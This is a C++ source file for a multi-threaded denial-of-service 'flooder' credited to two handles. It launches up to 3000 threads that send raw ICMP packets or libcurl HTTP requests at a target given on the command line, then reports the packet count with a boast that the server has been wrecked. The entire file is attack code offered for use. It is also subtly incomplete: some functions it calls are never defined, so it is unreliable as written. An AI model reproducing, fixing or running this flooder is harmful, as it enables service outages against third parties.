// stx_final.cpp - TUNG-TUNG SAYUR Flooder by @kecee_pyrite x Jungker
#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <atomic>
#include <random>
#include <cstring>
#include <csignal>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sched.h>
#include <fstream>
#include <curl/curl.h> // For HTTP Flood (Layer 7)

#define MAX_THREADS 3000
#define DEFAULT_BURST 50
#define DEFAULT_PAYLOAD_SIZE 1024
#define MAX_TOTAL_PACKETS 1000000000

std::atomic<bool> running(true);
std::atomic<long long> total_sent(0);

// Helper function to send HTTP GET requests (Layer 7)
void http_flood(const std::string& url, int duration) {
    CURL* curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (curl) {
        auto start_time = std::chrono::steady_clock::now();
        while (running) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
            if (elapsed >= duration || total_sent >= MAX_TOTAL_PACKETS) break;

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L); // HEAD request to reduce bandwidth
            res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                ++total_sent;
            }
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}

// Helper function to send ICMP requests (Layer 3)
void icmp_flood(const std::string& ip, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) return;

    sockaddr_in target{};
    target.sin_family = AF_INET;
    inet_pton(AF_INET, ip.c_str(), &target.sin_addr);

    char packet[64] = {};
    auto start_time = std::chrono::steady_clock::now();
    while (running) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - start_time).count();
        if (elapsed >= duration || total_sent >= MAX_TOTAL_PACKETS) break;

        sendto(sock, packet, sizeof(packet), 0, (sockaddr*)&target, sizeof(target));
        ++total_sent;
    }
    close(sock);
}

// Flood dispatcher based on Layer type
void start_flood_layer(const std::string& target, int duration, int threads, int layer) {
    std::vector<std::thread> workers;
    if (layer == 3) {
        for (int i = 0; i < threads; ++i) {
            workers.emplace_back(icmp_flood, target, duration);
        }
    } else if (layer == 7) {
        for (int i = 0; i < threads; ++i) {
            workers.emplace_back(http_flood, target, duration);
        }
    }
    for (auto& t : workers) {
        t.join();
    }
}

// Main entry point for Layer 3-7 Floods
void start_flood(const std::string& target, int port, int duration, int threads, int layer) {
    print_banner();
    std::cout << "\n[!] Validation: stx OK\n";
    std::cout << "[*] Flood Target  : " << target << " | Threads: " << threads << "\n\n";

    signal(SIGINT, stop);
    start_flood_layer(target, duration, threads, layer);

    double total_gb = (total_sent * DEFAULT_PAYLOAD_SIZE) / (1024.0 * 1024 * 1024);
    std::cout << "\n[+] Total packets sent : " << total_sent.load() << "\n";
    std::cout << "[+] Estimated data sent: " << total_gb << " GB\n";
    std::cout << "\n[✓] Flood completed successfully. Server disayur.\n";
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        std::cerr << "Usage: " << argv[0] << " <target> <duration> <threads> <layer>\n";
        return 1;
    }

    std::string target = argv[1];
    int duration = std::stoi(argv[2]);
    int threads = std::min(std::stoi(argv[3]), MAX_THREADS);
    int layer = std::stoi(argv[4]); // Layer 3 or 7

    if (layer != 3 && layer != 7) {
        std::cerr << "[X] Invalid layer. Use 3 (Network Layer) or 7 (Application Layer).\n";
        return 1;
    }

    start_flood(target, 0, duration, threads, layer);
    return 0;
}